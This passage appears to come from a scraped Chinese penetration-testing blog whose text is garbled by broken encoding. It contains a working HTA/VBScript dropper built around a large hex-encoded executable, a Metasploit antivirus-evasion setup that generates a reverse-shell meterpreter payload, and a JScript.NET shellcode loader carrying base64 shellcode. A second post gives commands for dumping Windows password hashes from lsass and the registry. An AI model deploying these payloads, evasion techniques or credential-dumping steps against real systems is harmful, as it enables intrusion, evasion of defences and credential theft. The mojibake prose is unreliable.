6e954ffffff8d742600c744240400000000c704240b000000e8b40f000083f801743c85c00f847bffffffc704240b000000ffd083c424b8ffffffff5b5ec20400c744240401000000c7042404000000e87d0f0000b8ffffffffe92affffffc744240401000000c704240b000000e85f0f0000b8ffffffffe90cffffff31c0e905ffffff8db600000000c744240401000000c7042408000000e8340f000085f6b8ffffffff0f84defeffff8944241ce8f60900008b44241ce9ccfeffff9090909090909090909090909083ec3ca14c504000dd442448dd442450dd44245885c07429d9ca8b542440dd5c2418dd5c2420dd5c2428895424108b542444895424148d542410891424ffd0eb06ddd8ddd8ddd883c43cc3908d7426008b442404a34c504000e9b20e0000669083ec3cba844040008b4424408b0883e90183f90577078b148da0414000dd4018dd5c2420dd4010dd5c2418dd4008dd5c24108b400489542408c7442404944040008944240ca1b461400083c040890424e8630e000031c083c43cc3909090909031c0c3909090909090909090909090905383ec18a1b4614000c74424081b0000008d5c2424c744240401000000c70424b841400083c0408944240ce8200e00008b442420895c240889442404a1b461400083c040890424e80c0e0000e80f0e0000eb0d909090909090909090909090905589cd57565389c383ec6c8b0d585040008954241c85c90f8ec5010000a15450400031f68b500439d3720e8b780803570839d30f82d700000083c60183c00c39ce75e1891c24e8b505000085c089c70f84b40100008d14768b3554504000c1e20201d6894608c7060000000089542418e86b0600008b54241803470c8946048d4424408b358061400089442404a154504000c74424081c0000008b441004890424ffd683ec0c85c08b5424180f84370100008b44245483f8040f85d2000000830558504000018d442424c74424081c00000089442404891c24ffd683ec0c85c00f84330100008b44243883f80475298b44241c896c2408891c2489442404e87d0c000083c46c5b5e5f5dc3908d7426008b3580614000ebae83f84074d28b4424308d7c245c8b357c614000897c240cc744240840000000894424048b442424890424ffd683ec108b44241c896c2408891c2489442404e8250c00008b44243883f840749f83f804749a8b44245c897c240c894424088b442430894424048b442424890424ffd683ec1083c46c5b5e5f5dc383f8400f8425ffffff8b44244c031554504000c744240840000000894424048b4424408954240c890424ff157c61400083ec1085c00f85f3feffffff1538614000c704242842400089442404e8befdffff31f6e95afeffffa1545040008b441004894424088b4708c70424f441400089442404e897fdffff895c2404c70424d4414000e887fdffff895c2408c74424041c000000c70424f4414000e86ffdffffeb0d909090909090909090909090905589e557565383ec4ca15050400085c0740e8d65f45b5e5f5dc38db600000000c7055050400001000000e8d10300008d04408d04851e00000083e0f0e87f0a0000c705585040000000000029c48d44241f83e0f0a354504000b8d04240002dd042400083f8077eaa83f80bbbd04240000f8eea000000a1d042400085c07511a1d442400085c00f84c00000008d74260081fbd04240000f8376ffffffbe000040008b4304b90400000001f08b10031383c3088955e48d55e4e803fdffff81fbd042400072dc8b0d5850400085c90f8e3fffffff31db31f68b3d80614000eb139083c60183c30c3b35585040000f8d20ffffffa15450400001d88b1085d274e18d55c4c74424081c000000895424048b4004890424ffd783ec0c85c00f84510100008d45e48944240ca1545040008b0418894424088b45d0894424048b45c4890424ff157c61400083ec10eb94a1d842400085c07520bbdc4240008db6000000008b3b85ff0f8526ffffff8b730485f60f851bffffff8b430883f8010f851401000083c30c81fbd04240000f8382feffff0fb65308b8000040008b0b03430483fa108bb100004000744183fa20747283fa08741789542404c7042484424000c745e000000000e896fbffff0fb638f7c780000000742081cf00ffffff29cf81ef0000400001fe8975e0eb270fb738f7c700800000755b29cf81ef0000400001fe83fa108975e0745c83fa20742383fa08752bb9010000008d55e0e8a2fbffffeb1c8b1029ca81ea0000400001f28955e0b9040000008d55e0e884fbffff83c30c81fbd04240000f8245ffffffe975feffff81cf0000ffff29cf81ef0000400001fe8975e0b9020000008d55e0e850fbffffebca031d545040008b4304894424088b43088b4008c70424f441400089442404e8cbfaffff89442404c7042450424000e8bbfaffff90909090909090909090908b54240431c066813a4d5a7403f3c39003523c813a5045000075f231c066817a180b010f94c0c389f68dbc27000000005631c0538b54240c8b5c241003523c0fb772060fb74a1485f674230fb7c98d440a1831d28b480c39d9770703480839cb720c83c20183c02839f272e831c05b5ec3eb0d909090909090909090909090905557565331db83ec1c8b7c2430893c24e80b08000083f8087759c7042400004000e85affffff85c07449a13c0040000fb7a8060040000fb79014004000050000400085ed742d0fb7d231f68d5c1018eb0a83c60183c32839ee7325c744240808000000897c2404891c24e82908000085c075de83c41c89d85b5e5f5dc38d760083c41c31db89d85b5e5f5dc38d74260083ec08c7042400004000e8e1feffff89c231c085d274198b44240cc70424000040002d0000400089442404e8f0feffff83c408c38db6000000008dbf0000000083ec04c7042400004000e8a1feffff31d285c0740ca13c0040000fb7900600400089d083c404c389f68dbc2700000000565383ec04c70424000040008b5c2410e86bfeffff31d285c0743ea13c0040000fb788060040000fb7b014004000050000400085c974220fb7f68d54301831c0f6422720740785db740f83eb0183c00183c22839c872e931d283c40489d05b5ec3eb0d9090909090909090909090909083ec04c7042400004000e801feffff31d285c0b8000040000f45d083c40489d0c3eb0d909090909090909090909090905331db83ec08c7042400004000e8cefdffff85c0750a83c40889d85bc38d76008b442410c70424000040002d0000400089442404e8d7fdffff85c074d98b582483c408f7d3c1eb1f89d85bc38d7426005731ff565383ec08c70424000040008b5c2418e878fdffff85c07455a13c0040008bb08000400085f6744689742404c7042400004000e885fdffff85c0743281c600004000750feb288db4260000000083eb0183c6148b560485d275078b460c85c0741c85db7fe88b7e0c81c70000400083c40889f85b5e5fc38db60000000083c40831ff89f85b5e5fc3908d7426005383ec18a15c50400085c0740583c4185bc331c08904248d5801e851ffffff85c0747d0fb61080fa4d740580fa6d75500fb6500180fa53740580fa7375420fb6500280fa56740580fa7675340fb6500380fa43740580fa6375260fb6500480fa52740580fa7275180fb6500580fa54741380fa74740e83ea3080fa097606669089d8eb90890424ff153c61400083ec0485c0a35c5040000f8570ffffff8d7600c70424b0424000ff155c61400083ec04a35c504000e953ffffff909090909090dbe3c39090909090909090909090909083ec0ca10c3640008b0085c074196690ffd0a10c3640008d50048b400489150c36400085c075e983c40cc3908d7426005383ec188b1db02a400083fbff742485db740fff149db02a400083eb018d760075f1c7042430254000e802f4ffff83c4185bc331dbeb0289c38d43018b1485b02a400085d275f0ebc68db426000000008b0d6050400085c97406f3c38d742600c7056050400001000000eb949090909083ec4ca118364000895c243c89742440897c24443d4ee640bb896c2448c744242000000000c7442424000000007421f7d0a31c3640008b5c243c8b7424408b7c24448b6c244883c44cc38db6000000008d442420890424ff154861400083ec048b4424248b6c24208944241cff153061400089c7ff153461400089c6ff154c61400089c38d442428890424ff156061400083ec04336c241c336c2428336c242c31fd31f531dd89e881fd4ee640bbf7d07410892d18364000a31c364000e974ffffffb8b019bf44bd4fe640bbebe466905589e583ec288b45048d5504891544514000c70560534000090400c0c7056453400001000000a338514000a36c5340008b4508c7042400000000a32c514000a1183640008945f0a11c3640008945f4ff156461400083ec04c70424c8424000ff157461400083ec04ff152c614000c7442404090400c0890424ff156c61400083ec08e8490300009090909090909090905557565383ec1cc70424c4534000ff15246140008b1ddc53400083ec0485db74348b2d706140008b3d386140008d76008b03890424ffd583ec0489c6ffd785c0750c85f674088b4304893424ffd08b5b0885db75dbc70424c4534000ff155461400083ec0483c41c5b5e5f5dc38d760083ec1ca1c0534000895c241431db8974241885c0750e89d88b7424188b5c241483c41cc3c74424040c000000c7042401000000e8a802000085c089c674498b442420c70424c453400089068b442424894604ff1524614000a1dc5340008935dc53400089460883ec04c70424c4534000ff155461400089d883ec048b5c24148b74241883c41cc3bbffffffffeb8866905383ec18a1c05340008b5c242085c0750783c41831c05bc3c70424c4534000ff15246140008b15dc53400083ec0485d2741d8b0239d87510eb4c8db6000000008b0839d9742089c28b420885c075f1c70424c4534000ff155461400083ec0483c41831c05bc38b4808894a08890424e884010000c70424c4534000ff155461400083ec04ebd98b4208a3dc53400089d0ebda8db426000000008dbc270000000083ec1c8b44242483f8017444721283f803745db80100000083c41cc38d742600a1c053400085c07569a1c053400083f80175e0c705c053400000000000c70424c4534000ff152061400083ec04ebc490a1c053400085c07427c705c053400001000000b80100000083c41cc38d742600a1c053400085c0749ae8e2fdffffeb93c70424c4534000ff155061400083ec04ebc7e8c9fdffffeb909090909090909051503d001000008d4c240c721581e9001000008309002d001000003d0010000077eb29c18309005859c39090000000008b44240c8b5424088b4c2404f00fb111c3eb0d909090909090909090909090908b44240c8b5424088b4c2404f00fb111c20c0090909090909090909090909090ff258c6140009090ff25986140009090ff25e46140009090ff25e06140009090ff25ec6140009090ff25a86140009090ff25a46140009090ff25b06140009090ff25d06140009090ff25d86140009090ff25b86140009090ff25886140009090ff25c06140009090ff25e86140009090ff259c6140009090ff25d46140009090ff25dc6140009090ff25f46140009090ff25c86140009090ff25f06140009090ff25cc614000909000000000000000005589e583ec18e855eaffffc7042440154000e8e9eeffffc9c390909090909090ffffffff902a400000000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010200000110200005694e0fa61616161aa7c69fa56948073b3a5329eddc6d07104986ba8421f92d25923aadc676bd13afaa8818654b8c03b9999e13db464b2adddc6f07114a8e12addd4987f96e0aafb86c46bb24e1fb8da574703c61f1fd4715742d10567544c3b9999e13d6e74950e55e918c12bb095180e1fb8de574786715adf6ba24a953371521fe12adfd0c4de0dcf81a30cc51f1a0ecbba71447f66a73efa858e56fc979338fdb4921ae3c6fda941087a5694e0b739ee89963af5cfcf78a4c0d235fb8d8a37e089983af1dbda1bc7a9bf76adceca6db4b79338f08f8d25b4aeae76a2cecb6db4b79338a2d4c176ecd6ce6db4b4883ff0859422bbd5d466afc0b819dda5c36dd1aeaf05bde0a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20ecce0a3676bb7ad01c3b1926cc2995da9410b830da529ab07fee3ab07fcb0fa5694b3aa3ec36965906b351134cdd12804fce0f83610b2a804c5b2aa3e7fb5d46d6b357390a51fad01c3b7ac3eb9e6e22d6b357f96e0a4cba911168e521d19115ffc4a3fb4c91f2fdf5588bf77cad10583a51fad3c93b1ac06fc57adb69f1f2fe994cffa56ad278eeaa51f11437fa912cf6b1f0579f8b6b71b94e092a62142aca9418aba3e94f0fa56fce0fa1694b7920e30b31fa94173a9051d07ad3e94c0fa56c7b69244026918a941653a22596bfd5757653a2371b839bea31f05a9a5d9c878a5d6c278a5d9c378a5d4c85658354f2150254041505b345c505a58353428505e2937434329377d2445494341522d5354414e444152442d414e544956495255532d544553542d46494c452124482b482a4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ff000000ffffffffffffffffc02a400002000000ffffffff4ee640bbb119bf440000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f7365745f696e76616c69645f706172616d657465725f68616e646c657200006c696267636a2d31322e646c6c005f4a765f5265676973746572436c61737365730000006d696e67776d31302e646c6c005f5f6d696e67777468725f72656d6f76655f6b65795f64746f72005f5f6d696e67777468725f6b65795f64746f720010174000556e6b6e6f776e206572726f720000005f6d61746865727228293a20257320696e2025732825672c2025672920202872657476616c3d2567290a0000417267756d656e7420646f6d61696e206572726f722028444f4d41494e2900417267756d656e742073696e67756c617269747920285349474e2900004f766572666c6f772072616e6765206572726f7220284f564552464c4f57290054686520726573756c7420697320746f6f20736d616c6c20746f20626520726570726573656e7465642028554e444552464c4f5729000000546f74616c206c6f7373206f66207369676e69666963616e63652028544c4f53532900005061727469616c206c6f7373206f66207369676e69666963616e63652028504c4f53532900000000c0404000df404000fc4040001c41400054414000784140004d696e67772d7736342072756e74696d65206661696c7572653a0a004164647265737320257020686173206e6f20696d6167652d73656374696f6e0020205669727475616c5175657279206661696c656420666f7220256420627974657320617420616464726573732025700000000020205669727475616c50726f74656374206661696c6564207769746820636f6465203078257800002020556e6b6e6f776e2070736575646f2072656c6f636174696f6e2070726f746f636f6c2076657273696f6e2025642e0a0000002020556e6b6e6f776e2070736575646f2072656c6f636174696f6e206269742073697a652025642e0a0000006d00730076006300720074002e0064006c006c00000000006053400080504000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003c6000000000000000000000a46500001c610000a8600000000000000000000024660000886100000000000000000000000000000000000000000000fc6100000c620000246200003c6200004a6200005e620000746200008a6200009a620000ae620000c0620000d2620000ec620000fc620000186300003063000040630000506300006a6300008863000090630000a4630000b2630000ce630000de630000f063000000000000006400000e6400001e6400002a6400003a6400004c640000606400006a64000078640000826400008c64000098640000a0640000a8640000b2640000bc640000c8640000d0640000da640000e2640000ec640000f4640000fe64000008650000126500001c650000266500003065000000000000fc6100000c620000246200003c6200004a6200005e620000746200008a6200009a620000ae620000c0620000d2620000ec620000fc620000186300003063000040630000506300006a6300008863000090630000a4630000b2630000ce630000de630000f063000000000000006400000e6400001e6400002a6400003a6400004c640000606400006a64000078640000826400008c64000098640000a0640000a8640000b2640000bc640000c8640000d0640000da640000e2640000ec640000f4640000fe64000008650000126500001c650000266500003065000000000000a7004372656174655468726561640000c40044656c657465437269746963616c53656374696f6e00df00456e746572437269746963616c53656374696f6e00005301467265654c69627261727900b10147657443757272656e7450726f6365737300b20147657443757272656e7450726f63657373496400b50147657443757272656e7454687265616449640000ee014765744c6173744572726f720000fe014765744d6f64756c6548616e646c65410000290247657450726f63416464726573730000440247657453746172747570496e666f41005b0247657453797374656d54696d65417346696c6554696d650073024765745469636b436f756e740000c602496e697469616c697a65437269746963616c53656374696f6e0001034c65617665437269746963616c53656374696f6e000003034c6f61644c69627261727941000006034c6f61644c69627261727957000067035175657279506572666f726d616e6365436f756e746572003104536574556e68616e646c6564457863657074696f6e46696c746572003d04536c6565700049045465726d696e61746550726f6365737300005004546c7347657456616c7565005d04556e68616e646c6564457863657074696f6e46696c746572000074045669727475616c416c6c6f6300007d045669727475616c50726f74656374000080045669727475616c5175657279000038005f5f646c6c6f6e65786974003b005f5f6765746d61696e61726773003c005f5f696e6974656e760045005f5f6c636f6e765f696e6974000069005f5f7365745f6170705f7479706500006c005f5f736574757365726d61746865727200007a005f61636d646c6e008f005f616d73675f657869740000a0005f63657869740000fc005f666d6f646500003d015f696e69747465726d0041015f696f620000a5015f6c6f636b0047025f6f6e6578697400f5025f756e6c6f636b007b035f77696e6d616a6f7200bd0361626f727400cb0363616c6c6f630000d503657869740000e503667072696e746600ec03667265650000f703667772697465000024046d616c6c6f6300002c046d656d637079000049047369676e616c00005d047374726c656e000060047374726e636d7000800476667072696e7466000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000004b45524e454c33322e646c6c00000000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000006d73766372742e646c6c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010104000000000000000000060104000a0184000000000000000000010174000c016400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000198040001c804000345040002070400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot; Dim var_obj Set var_obj = CreateObject(&quot;Scripting.FileSystemObject&quot;) Dim var_stream Dim var_tempdir Dim var_tempexe Dim var_basedir Set var_tempdir = var_obj.GetSpecialFolder(2) var_basedir = var_tempdir &amp; &quot;\\&quot; &amp; var_obj.GetTempName() var_obj.CreateFolder(var_basedir) var_tempexe = var_basedir &amp; &quot;\\&quot; &amp; &quot;evil.exe&quot; Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false) For i = 1 to Len(var_shellcode) Step 2 var_stream.Write Chr(CLng(&quot;&amp;H&quot; &amp; Mid(var_shellcode,i,2))) Next var_stream.Close Dim var_shell Set var_shell = CreateObject(&quot;Wscript.Shell&quot;) var_shell.run var_tempexe, 0, true var_obj.DeleteFile(var_tempexe) var_obj.DeleteFolder(var_basedir) End Function var_func self.close&lt;/script&gt; ÂèØ‰ª•ÁúãÂà∞shellcode‰∏∫PEÊ†ºÂºèÔºåÊâßË°åË∞ÉÁî®Wscript.shell ÂêåÊ†∑‰ºöË¢´DefenderÊã¶Êà™ 0x04 MetaSploit::windows_defender_js_htaMsf5Êõ¥Êñ∞ÂêéÊñ∞Âä†ÂÖ•‰∫Ü‰∏§‰∏™evasion evasion/windows/windows_defender_exe evasion/windows/windows_defender_js_hta exeÊä•ÊØíÊúâÁÇπÊÉ®Ê∑° ‰ΩÜÊòØdefenderÂíåÁÅ´ÁªíËøòÊòØÊ≤°ÂÖ≥Á≥ªÁöÑ htaÊñá‰ª∂Defender,ÁÅ´ÁªíÔºå360ÈÉΩËÉΩËøá 123456789101112msf5 &gt; use evasion/windows/windows_defender_js_htamsf5 evasion(windows/windows_defender_js_hta) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf5 evasion(windows/windows_defender_js_hta) &gt; set lhost 192.168.1set lhost 192.168.1.105 set lhost 192.168.121.1msf5 evasion(windows/windows_defender_js_hta) &gt; set lhost 192.168.1.105lhost =&gt; 192.168.1.105msf5 evasion(windows/windows_defender_js_hta) &gt; set lport 8877lport =&gt; 8877msf5 evasion(windows/windows_defender_js_hta) &gt; exploit[+] QWZwXErrm.hta stored at /Users/patrilic/.msf4/local/QWZwXErrm.hta Ê†∏ÂøÉ‰ª£Á†Å1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import System;import System.Runtime.InteropServices;import System.Reflection;import System.Reflection.Emit;import System.Runtime;import System.Text;function InvokeWin32(dllName:String, returnType:Type, methodName:String, parameterTypes:Type[], parameters:Object[])&#123; // Begin to build the dynamic assembly var domain = AppDomain.CurrentDomain; var name = new System.Reflection.AssemblyName('PInvokeAssembly'); var assembly = domain.DefineDynamicAssembly(name, AssemblyBuilderAccess.Run); var module = assembly.DefineDynamicModule('PInvokeModule'); var type = module.DefineType('PInvokeType',TypeAttributes.Public + TypeAttributes.BeforeFieldInit); // Define the actual P/Invoke method var method = type.DefineMethod(methodName, MethodAttributes.Public + MethodAttributes.HideBySig + MethodAttributes.Static + MethodAttributes.PinvokeImpl, returnType, parameterTypes); // Apply the P/Invoke constructor var ctor = System.Runtime.InteropServices.DllImportAttribute.GetConstructor([Type.GetType(\"System.String\")]); var attr = new System.Reflection.Emit.CustomAttributeBuilder(ctor, [dllName]); method.SetCustomAttribute(attr); // Create the temporary type, and invoke the method. var realType = type.CreateType(); return realType.InvokeMember(methodName, BindingFlags.Public + BindingFlags.Static + BindingFlags.InvokeMethod, null, null, parameters);&#125;function VirtualAlloc( lpStartAddr:UInt32, size:UInt32, flAllocationType:UInt32, flProtect:UInt32)&#123; var parameterTypes:Type[] = [Type.GetType(\"System.UInt32\"),Type.GetType(\"System.UInt32\"),Type.GetType(\"System.UInt32\"),Type.GetType(\"System.UInt32\")]; var parameters:Object[] = [lpStartAddr, size, flAllocationType, flProtect]; return InvokeWin32(\"kernel32.dll\", Type.GetType(\"System.IntPtr\"), \"VirtualAlloc\", parameterTypes, parameters );&#125;function CreateThread( lpThreadAttributes:UInt32, dwStackSize:UInt32, lpStartAddress:IntPtr, param:IntPtr, dwCreationFlags:UInt32, lpThreadId:UInt32)&#123; var parameterTypes:Type[] = [Type.GetType(\"System.UInt32\"),Type.GetType(\"System.UInt32\"),Type.GetType(\"System.IntPtr\"),Type.GetType(\"System.IntPtr\"), Type.GetType(\"System.UInt32\"), Type.GetType(\"System.UInt32\") ]; var parameters:Object[] = [lpThreadAttributes, dwStackSize, lpStartAddress, param, dwCreationFlags, lpThreadId ]; return InvokeWin32(\"kernel32.dll\", Type.GetType(\"System.IntPtr\"), \"CreateThread\", parameterTypes, parameters );&#125;function WaitForSingleObject( handle:IntPtr, dwMiliseconds:UInt32)&#123; var parameterTypes:Type[] = [Type.GetType(\"System.IntPtr\"),Type.GetType(\"System.UInt32\")]; var parameters:Object[] = [handle, dwMiliseconds ]; return InvokeWin32(\"kernel32.dll\", Type.GetType(\"System.IntPtr\"), \"WaitForSingleObject\", parameterTypes, parameters );&#125;function ShellCodeExec()&#123; var MEM_COMMIT:uint = 0x1000; var PAGE_EXECUTE_READWRITE:uint = 0x40; var shellcodestr:String = '/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACKtwKgBaUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJNMclqBEFYSIn5QboC2chf/9VIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//VSAHDSCnGSIX2deFB/+c=' var shellcode:Byte[] = System.Convert.FromBase64String(shellcodestr); var funcAddr:IntPtr = VirtualAlloc(0, UInt32(shellcode.Length),MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length); var hThread:IntPtr = IntPtr.Zero; var threadId:UInt32 = 0; // prepare data var pinfo:IntPtr = IntPtr.Zero; // execute native code hThread = CreateThread(0, 0, funcAddr, pinfo, 0, threadId); WaitForSingleObject(hThread, 0xFFFFFFFF);&#125;try&#123;ShellCodeExec();&#125;catch(e)&#123;&#125; hta‰ª£Á†ÅÁâáÊÆµ Wscript.shellÊâßË°å ÁîüÊàêJSÊâßË°åShellcode 0x05 LINKSCACTUSTORCH.hta‰ΩøÁî®mshta.exeÁªïËøáÂ∫îÁî®Á®ãÂ∫èÁôΩÂêçÂçïÔºàÂ§öÁßçÊñπÊ≥ïÔºâÁ¨¨‰∏ÉÂçÅ‰∫îËØæÔºöÂü∫‰∫éÁôΩÂêçÂçïMshta.exeÊâßË°åpayloadÁ¨¨‰∫îÂ≠£","categories":[],"tags":[{"name":"ÂëΩ‰ª§ÊâßË°å","slug":"ÂëΩ‰ª§ÊâßË°å","permalink":"http://patrilic.top/tags/ÂëΩ‰ª§ÊâßË°å/"}]},{"title":"Â∏∏Áî® Windows ÊäìÂèñHash","slug":"Windows ÊäìÂèñHash","date":"2019-05-04T16:20:33.000Z","updated":"2019-07-13T03:00:59.828Z","comments":true,"path":"2019/05/05/Windows ÊäìÂèñHash/","link":"","permalink":"http://patrilic.top/2019/05/05/Windows ÊäìÂèñHash/","excerpt":"","text":"Êé®Ëçê‰ΩøÁî® ProcdumpÔºåreg Âíå sharpdump ÂØºÂá∫Êú¨Âú∞ÔºåÂÜçÊÉ≥ÂäûÊ≥ï‰ªéÂÜÖÁΩë‰∏≠ËøêÂá∫Êù•Êú¨Âú∞Á†¥Ëß£ ÊµãËØïÊú∫Âô®: Windows 10 1809 0x01 Procdump + MimikatzProcdump(ÁÆ°ÁêÜÂëòÊùÉÈôê‰∏ãËøêË°å)12C:\\temp\\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bitsC:\\temp\\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits ÁÑ∂ÂêéÊú¨Âú∞Ëß£Âá∫hashÂç≥ÂèØ12sekurlsa::minidump C:\\lsass.dmpsekurlsa::logonpasswords full 0x02 Reg + impacket/Mimikatz (Âº∫Êé®)‰ΩøÁî®RegÈúÄË¶ÅNT/SYSTEMÊùÉÈôê12345reg save HKLM\\SYSTEM system.hivreg save HKLM\\SAM sam.hivreg save HKLM\\security security.hiv Mimikatz Ë∞ÉÁî® lsadump1lsadump::sam /system:system.hiv /sam:sam.hiv impacket/secretsdump.py1python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL 0x03 Sharpdump (Âº∫Êé®)Out-Minidump.ps1 ÁöÑ C#ÁâàÊú¨ ÁºñËØëÁªìÊûúÈúÄË¶Å.NET 3.5ÁâàÊú¨Ê°ÜÊû∂ 0x04 Wce„ÄÅQuarks PwDump„ÄÅGetPass‚Ä¶‚Ä¶Ê≤°ÊÄé‰πàÁî®ËøáÔºåÈÉΩÊòØ‰ª•ÂâçÊØîËæÉËÄÅÁöÑÔºåGetpassÊòØMimikatzÁöÑÁºñËØëÁâàÊú¨ÔºåÊ≤°Âï•ÊÑèÊÄù 0x05 Msf moduleshashdumpÊù°‰ª∂: Meterpreter Session NT/SYSTEM hashdumpÂè™ËÉΩdumpÊú¨Âú∞Áî®Êà∑ smart_hashdumpÊù°‰ª∂ Meterpreter Session NT/SYSTEM ÂèØ‰ª•dumpÊú¨Âú∞ + ÂüüÁî®Êà∑hash kiwiÊù°‰ª∂ Meterpreter Session NT/SYSTEM","categories":[],"tags":[{"name":"ÂÜÖÁΩëÊ∏óÈÄè","slug":"ÂÜÖÁΩëÊ∏óÈÄè","permalink":"http://patrilic.top/tags/ÂÜÖÁΩëÊ∏óÈÄè/"}]},{"title":"Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõÈÉ®ÂàÜWeb Write up","slug":"Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite 